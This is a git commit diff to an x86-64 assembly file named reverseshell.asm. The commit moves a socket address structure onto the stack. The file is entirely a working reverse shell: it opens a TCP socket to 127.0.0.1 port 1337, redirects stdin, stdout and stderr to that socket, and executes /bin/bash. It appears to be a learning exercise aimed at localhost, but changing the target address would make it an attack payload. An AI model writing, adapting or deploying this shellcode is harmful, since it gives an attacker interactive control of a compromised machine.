16b63b1a7ad149951ffd5a2beebf7e62c2451e9b
Dion Bosschieter <dbosschieter@transip.nl>
2023-10-07 22:32:55 +0200

    reverseshell.asm: Move addr struct to stack

--- reverseshell.asm
+++ reverseshell.asm
@@ -1,52 +1,26 @@
-section .data
-    struc sockaddr
-        sin_family  resb 2
-        sin_port    resb 2
-        sin_addr    resb 4
-        sin_padding resb 8
-    endstruc
-
-    addr istruc sockaddr
-        at sin_family ,  dw 2
-        at sin_port ,    db 0x05, 0x39
-        at sin_addr ,    db 127, 0, 0, 1
-        at sin_padding , db 0,0,0,0,0,0,0,0
-    iend
-
 section .text
 global _start
 
 _start:
-    mov rax, `h\0\0\0\0\0\0\0`
-    push rax
-    mov rax, `/bin/bas`
-    push rax
-
-    mov rax, 1
-    mov rdi, 1 ; stdout
-    mov rsi, rsp
-    mov rdx, 10 ; 4 bytes string.
-    syscall
-
-    mov r14, rsp
-
 _socket:
     mov rbx, 2 ; AF_INET
     mov rcx, 1 ; SOCK_STREAM
     mov rdx, 6 ; IPPROTO_TCP
     mov rax, 359; sys_socket
     int 0x80 ; syscall
-    cmp rax,-1
-    jz _exit
     mov r13, rax ; save file descriptor
 
 _connect:
-    mov rax, 362
-    mov rbx, r13
-    mov rcx, addr
+    mov rax, `\0\0\0\0\0\0\0\0` ; padding
+    push rax
+    mov rax, 0x0100007f39050002 ; 127.0.0.1:1337 AF_INET
+    push rax
+
+    mov rax, 42 ; connect
+    mov rdi, r13
+    mov rsi, rsp
     mov rdx, 0x10
-    ; call connect
-    int 0x80
+    syscall
 
     mov rax, 63 ; dup2
     mov rbx, r13
@@ -63,8 +37,14 @@ _connect:
     mov rcx, 2 ; stderr
     int 0x80
 
+    ; prepare execing bin/bash
+    mov rax, `h\0\0\0\0\0\0\0`
+    push rax
+    mov rax, `/bin/bas`
+    push rax
+
     mov rax, 59 ; execve
-    mov rdi, r14
+    mov rdi, rsp
     mov rsi, 0
     mov rdx, 0
     syscall
